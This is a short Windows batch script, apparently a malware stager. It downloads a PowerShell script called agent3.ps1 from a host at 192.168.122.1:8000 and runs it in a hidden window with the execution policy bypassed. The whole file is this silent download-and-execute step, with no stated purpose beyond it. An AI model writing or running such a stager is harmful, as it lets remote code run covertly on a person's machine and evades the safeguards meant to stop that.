@echo off
curl.exe -s -o C:\Users\adsf\agent3.ps1 http://192.168.122.1:8000/agent3.ps1
start "" /b powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\adsf\agent3.ps1
exit
